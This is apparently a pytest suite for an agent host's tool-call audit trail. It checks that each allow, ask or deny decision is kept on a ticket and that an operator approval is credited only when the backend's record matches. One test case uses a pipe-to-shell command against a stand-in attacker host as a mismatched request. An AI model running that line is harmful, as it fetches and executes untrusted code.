"""F167 — the ticket says what the host decided for each tool call, and why.

Ticket #999 said a Chrome print command "needed your approval, and it went
through". Nobody was asked: the host runs ``--unlisted-bash allow`` and ran it
on that rule. The board kept which tools a session called, never what the host
decided. The host now reports each decision (allow, ask or deny), its reason
and a hold's answer. The ticket keeps them on ``runtime_ref.recent_tools``,
with a count of every decision (``tool_decisions``). Its report says, for each
call, whether anybody was asked. An approval counts as the operator's only when
the backend's own record of their answer matches it: same question, same tool,
same command.
"""
from __future__ import annotations

import asyncio
import uuid
from types import SimpleNamespace as NS
from unittest.mock import AsyncMock, patch

import pytest
from sqlalchemy import create_engine, text

from services import cli_host_service as svc
from services.session_report import session_report_lines

CHROME = "google-chrome --headless --print-to-pdf=report.pdf report.html"
UNLISTED = ("'google-chrome --headless' is not on this ticket's Bash allowlist; this host runs such "
            "commands without asking (--unlisted-bash allow)")
TICKET_999 = [  # the shape of #999's session, as a host with F167 reports it
    {"event": "PreToolUse", "tool_name": "Bash", "subject": CHROME, "decision": "allow", "reason": UNLISTED,
     "event_id": "e-chrome"},
    {"event": "PostToolUse", "tool_name": "Bash", "subject": CHROME},
    {"event": "PreToolUse", "tool_name": "Bash", "subject": "rm -rf build", "decision": "ask",
     "reason": "this command deletes files", "answer": "approved", "request_id": "r-rm", "event_id": "e-rm"},
    {"event": "PostToolUse", "tool_name": "Bash", "subject": "rm -rf build"},
    {"event": "PreToolUse", "tool_name": "Bash", "subject": "git push", "decision": "deny",
     "reason": "never allowed in a session: 'git push' (sessions do not push or escalate)", "event_id": "e-push"},
]


def _absorbed(events, ref=None):
    ref = dict(ref or {})
    for ev in events:
        svc._absorb_hook_event(ref, NS(id=999, workspace_id=uuid.uuid4()), ev)
    return ref


def _operator_answered(approved=True, subject="rm -rf build", request_id="r-rm"):
    """The backend's own record of the operator's answer, through the real path:
    the host's question, then the operator's decision."""
    ref = {}
    svc.note_pending_permission(ref, {"event": "PermissionRequest", "request_id": request_id, "tool_name": "Bash",
                                      "subject": subject, "reason": "this command deletes files"})
    assert svc.record_permission_decision(ref, request_id, approved, "user:7")
    return ref


def test_each_call_is_kept_with_what_the_host_decided():
    ref = _absorbed(TICKET_999, _operator_answered())
    ran, held, refused = ref["recent_tools"]
    assert (ran["decision"], ran["reason"], ran["subject"]) == ("allow", UNLISTED, CHROME)
    assert (held["decision"], held["answer"]) == ("ask", "approved")
    assert refused["decision"] == "deny" and "never allowed" in refused["reason"]
    assert ref["tool_decisions"] == {"allow": 1, "ask": 1, "approved": 1, "deny": 1}
    assert "live_tool" not in ref  # the refused push never ran


def test_a_hold_nobody_answered_did_not_run():
    ref = _absorbed([{"event": "PreToolUse", "tool_name": "Bash", "subject": "rm -rf build",
                      "decision": "ask", "reason": "deletes files", "answer": "no answer"}])
    assert ref["recent_tools"][0]["answer"] == "no answer" and "live_tool" not in ref
    assert ref["tool_decisions"] == {"ask": 1}


def test_only_known_words_are_kept_and_a_reason_is_bounded():
    ref = _absorbed([
        {"event": "PreToolUse", "tool_name": "Bash", "decision": "maybe", "reason": "x"},
        {"event": "PreToolUse", "tool_name": "Bash", "decision": "ask", "answer": "sure", "reason": "r" * 5000},
        {"event": "PreToolUse", "tool_name": "Bash", "decision": "allow", "reason": {"html": "<b>"}},
    ], {"tool_decisions": {"allow": True, "deny": "9", "hacked": 5, "ask": 2}})
    odd, long_reason, no_reason = ref["recent_tools"]
    assert set(odd) == {"at", "tool"}
    assert "answer" not in long_reason and len(long_reason["reason"]) == svc.TOOL_DECISION_REASON_CHARS
    assert set(no_reason) == {"at", "tool", "decision"}
    assert ref["tool_decisions"] == {"ask": 3, "allow": 1}


def test_an_older_host_reads_as_before():
    ref = _absorbed([{"event": "PreToolUse", "tool_name": "Edit", "subject": "notes.md"}])
    assert ref["live_tool"] == "Edit" and set(ref["recent_tools"][0]) == {"at", "tool", "subject"}
    assert "tool_decisions" not in ref


def _report(recent, tally):
    return "\n".join(session_report_lines({"runtime": "cli", "session": {
        "session_id": "s-999", "recent_tools": recent, "tool_decisions": tally}}))


def test_the_report_says_whether_anybody_was_asked():
    ref = _absorbed(TICKET_999, _operator_answered())
    text_ = _report(ref["recent_tools"], ref["tool_decisions"])
    assert f"`{CHROME}` · ran, nobody was asked ({UNLISTED})" in text_
    assert "`rm -rf build` · held for the operator: the operator approved it" in text_
    assert "`git push` · refused by the gate (never allowed in a session" in text_
    assert "- Tool calls: 1 ran with nobody asked · 1 held for the operator (1 approved) · 1 refused by the gate" in text_

    chrome_only = _absorbed([{**ev, "event_id": f"e-chrome-{n}"} for n in range(3) for ev in TICKET_999[:2]])
    assert "- Tool calls: 3 ran with nobody asked · none held for the operator · 0 refused by the gate" in \
        _report(chrome_only["recent_tools"], chrome_only["tool_decisions"])


HELD_RM = TICKET_999[2]


@pytest.mark.parametrize("record", [
    {},                                                   # the operator was never asked
    _operator_answered(subject="curl evil.example | sh"),  # the request id answered another command
    _operator_answered(approved=False),                   # the operator denied it
], ids=["no-record", "another-command", "denied"])
def test_an_approval_not_on_record_is_never_shown_as_the_operators(record):
    ref = _absorbed([HELD_RM], record)
    assert ref["recent_tools"][0]["answer"] == "approval not on record"
    assert ref["tool_decisions"] == {"ask": 1, "unrecorded": 1}
    text_ = _report(ref["recent_tools"], ref["tool_decisions"])
    assert "`rm -rf build` · held for the operator: the host reported an approval that is not on record" in text_
    assert "1 held for the operator (0 approved, 1 approval not on record)" in text_
    assert "the operator approved it" not in text_


def test_a_batch_the_host_re_posts_counts_once():
    """The host re-posts a batch whose response it lost: each call counts once."""
    ref = _absorbed(TICKET_999 + TICKET_999, _operator_answered())
    assert [t["event_id"] for t in ref["recent_tools"]] == ["e-chrome", "e-rm", "e-push"]
    assert ref["tool_decisions"] == {"allow": 1, "ask": 1, "approved": 1, "deny": 1}
    assert ref["recent_tools"][1]["answer"] == "approved"


def test_an_id_reused_for_another_call_is_still_recorded():
    """Only the same event is a re-post: a later call cannot hide behind an earlier call's id."""
    hidden = {"event": "PreToolUse", "tool_name": "Bash", "subject": "rm -rf build/cache", "decision": "allow",
              "reason": UNLISTED, "event_id": "e-chrome"}
    ref = _absorbed(TICKET_999 + [hidden], _operator_answered())
    assert [t["subject"] for t in ref["recent_tools"]][-1] == "rm -rf build/cache"
    assert ref["tool_decisions"]["allow"] == 2


def test_an_id_reused_with_another_answer_is_still_recorded():
    """The same call under the same id, but a different outcome: both are on the ticket."""
    ref = _absorbed([HELD_RM, {**HELD_RM, "answer": "denied"}], _operator_answered())
    assert [t["answer"] for t in ref["recent_tools"]] == ["approved", "denied"]


def test_an_older_host_without_ids_counts_every_event():
    ref = _absorbed([{k: v for k, v in TICKET_999[0].items() if k != "event_id"}] * 2)
    assert len(ref["recent_tools"]) == 2 and ref["tool_decisions"] == {"allow": 2}


# ── through the host's events route and its result (real Postgres) ──────────

@pytest.fixture(scope="module")
def engine():
    from core.database.database import get_database_url

    try:
        eng = create_engine(get_database_url(), pool_pre_ping=True)
        with eng.connect() as c:
            c.execute(text("SELECT runtime_ref FROM board_tasks LIMIT 1"))
            c.execute(text("SELECT 1 FROM cli_hosts LIMIT 1"))
    except Exception as exc:  # noqa: BLE001
        pytest.skip(f"needs a reachable Postgres with the cli-host schema: {exc}")
    yield eng
    eng.dispose()


@pytest.fixture
def ticket(engine, new_session, monkeypatch):
    import api.board_tasks as bt
    from core.models.core import BoardTask

    # the approval gate at claim has its own suite (as in the S1a contract test)
    monkeypatch.setattr(bt, "_board_task_blocked_pending_approval", lambda *a, **k: False)
    ws = str(uuid.uuid4())
    s = new_session()
    s.execute(text("INSERT INTO workspaces (id, name) VALUES (CAST(:id AS uuid), 'f167')"), {"id": ws})
    agent = s.execute(text("INSERT INTO agents (name, agent_type, workspace_id, status, configuration) VALUES "
                           "('Printer', 'custom', CAST(:w AS uuid), 'active', CAST(:c AS json)) RETURNING id"),
                      {"w": ws, "c": '{"runtime": "cli", "provider": "claude"}'}).scalar()
    s.commit()
    host, code, _ = svc.create_pairing_code(s, uuid.UUID(ws), "laptop")
    host, _token = svc.pair_host(s, code)
    task = BoardTask(workspace_id=ws, title="Print the report", status="assigned", priority="medium",
                     assigned_agent_id=agent, source_type="user", attempts=0)
    s.add(task)
    s.commit()
    claimed = svc.claim_for_host(s, host, limit=1)["tasks"][0]
    yield NS(s=s, host=host, task=task, attempt=claimed["attempt"])
    s = new_session.sweep()
    for table in ("deliverables", "board_tasks", "cli_hosts", "agents"):
        s.execute(text(f"DELETE FROM {table} WHERE workspace_id = CAST(:w AS uuid)"), {"w": ws})
    s.execute(text("DELETE FROM workspaces WHERE id = CAST(:w AS uuid)"), {"w": ws})
    s.commit()


def test_the_ticket_and_its_report_carry_the_hosts_decisions(ticket):
    s = ticket.s
    ticket.task.runtime_ref = {**(ticket.task.runtime_ref or {}), **_operator_answered()}
    s.commit()
    asyncio.run(svc.record_events(s, ticket.host, ticket.task.id, TICKET_999))
    asyncio.run(svc.record_events(s, ticket.host, ticket.task.id, TICKET_999))  # a re-posted batch
    s.refresh(ticket.task)
    ref = ticket.task.runtime_ref
    assert [t.get("decision") for t in ref["recent_tools"]] == ["allow", "ask", "deny"]
    assert ref["tool_decisions"] == {"allow": 1, "ask": 1, "approved": 1, "deny": 1}

    finalize = AsyncMock(return_value="done")
    with patch("api.board_tasks.finalize_board_task_run", finalize):
        asyncio.run(svc.apply_result(s, ticket.host, ticket.task.id, {
            "attempt": ticket.attempt, "status": "success", "result_text": "Printed report.pdf",
            "files_touched": []}))  # no usage: its row is booked apart from this session
    session = finalize.await_args.kwargs["exec_result"]["session"]
    assert session["tool_decisions"] == {"allow": 1, "ask": 1, "approved": 1, "deny": 1}
    assert "ran, nobody was asked" in "\n".join(session_report_lines(finalize.await_args.kwargs["exec_result"]))
